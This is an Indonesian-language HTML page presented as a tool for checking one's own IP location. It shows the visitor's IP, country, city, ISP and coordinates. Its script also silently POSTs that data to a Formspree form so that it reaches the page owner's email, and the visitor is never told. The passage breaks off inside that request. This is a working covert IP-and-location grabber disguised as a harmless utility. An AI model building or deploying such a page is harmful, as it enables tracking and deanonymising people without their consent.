<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Location Finder</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
</head>
<body class="bg-gray-100 font-sans min-h-screen flex flex-col items-center justify-center p-4">

    <div class="bg-white p-8 rounded-2xl shadow-lg max-w-lg w-full text-center">
        <h1 class="text-3xl font-bold text-green-600 mb-2">📍 IP Tracker</h1>
        <p class="text-gray-500 mb-6">Klik tombol di bawah untuk memeriksa lokasi perangkat Anda</p>

        <button onclick="cekDanKirimLokasi()" class="w-full bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-xl font-bold text-lg shadow-md transition duration-200 cursor-pointer">
            🟢 Cek Lokasi Saya
        </button>

        <div id="loading" class="hidden text-gray-600 font-medium animate-pulse mt-6">Sedang melacak dan memproses data...</div>
        <div id="statusMsg" class="hidden text-sm mt-4 font-semibold p-3 rounded-lg"></div>

        <div id="result" class="hidden text-left border-t pt-6 mt-6 space-y-3">
            <h3 class="font-bold text-gray-700 text-lg mb-2">Hasil Pelacakan:</h3>
            <div class="flex justify-between border-b pb-2"><span class="font-semibold text-gray-600">IP Address:</span> <span id="resIP" class="text-gray-900 font-medium"></span></div>
            <div class="flex justify-between border-b pb-2"><span class="font-semibold text-gray-600">Negara:</span> <span id="resCountry" class="text-gray-900 font-medium"></span></div>
            <div class="flex justify-between border-b pb-2"><span class="font-semibold text-gray-600">Kota:</span> <span id="resCity" class="text-gray-900 font-medium"></span></div>
            <div class="flex justify-between border-b pb-2"><span class="font-semibold text-gray-600">ISP / Provider:</span> <span id="resISP" class="text-gray-900 font-medium"></span></div>
            <div class="flex justify-between"><span class="font-semibold text-gray-600">Koordinat:</span> <span id="resCoords" class="text-gray-900 font-medium"></span></div>
        </div>
    </div>

    <script>
        async function cekDanKirimLokasi() {
            const loading = document.getElementById('loading');
            const statusMsg = document.getElementById('statusMsg');
            const result = document.getElementById('result');

            // Reset Tampilan
            loading.classList.remove('hidden');
            statusMsg.classList.add('hidden');
            result.classList.add('hidden');

            try {
                // 1. Ambil data lokasi menggunakan ipapi.co (Mendukung HTTPS secara gratis)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                if (data.error) {
                    throw new Error("Gagal mengambil data lokasi.");
                }

                // Tampilkan data di layar pengguna dengan format API baru
                document.getElementById('resIP').innerText = data.ip;
                document.getElementById('resCountry').innerText = `${data.country_name} (${data.country_code})`;
                document.getElementById('resCity').innerText = data.city;
                document.getElementById('resISP').innerText = data.org;
                document.getElementById('resCoords').innerText = `${data.latitude}, ${data.longitude}`;
                result.classList.remove('hidden');

                // 2. Kirim data tersebut ke email Anda via Formspree
                const formspreeUrl = "https://formspree.io/f/xojolajv"; 

                const emailResponse = await fetch(formspreeUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        Subject: `Laporan Lokasi Baru dari IP: ${data.ip}`,
                        IP_Address: data.ip,
                        Negara: data.country_name,
